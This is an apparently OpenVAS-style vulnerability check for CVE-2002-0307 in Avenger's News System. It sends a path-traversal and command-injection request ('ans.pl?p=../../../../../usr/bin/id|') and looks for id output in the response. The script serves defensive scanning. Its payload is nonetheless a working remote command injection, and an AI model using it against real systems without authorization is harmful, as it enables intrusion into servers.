if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10875" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 4147 );
	script_cve_id( "CVE-2002-0307" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_name( "Avenger's News System Command Execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 SecurITeam" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securiteam.com/unixfocus/5MP090A6KG.html" );
	script_tag( name: "solution", value: "See the referenced link on how to update the affected code
  to fix this vulnerability." );
	script_tag( name: "summary", value: "A security vulnerability in Avenger's News System (ANS) allows
  command execution by remote attackers who have access to the ANS page." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for url in make_list( dir + "/ans.pl?p=../../../../../usr/bin/id|&blah",
		 dir + "/ans/ans.pl?p=../../../../../usr/bin/id|&blah" ) {
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( buf, "uid=" ) && ContainsString( buf, "groups=" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

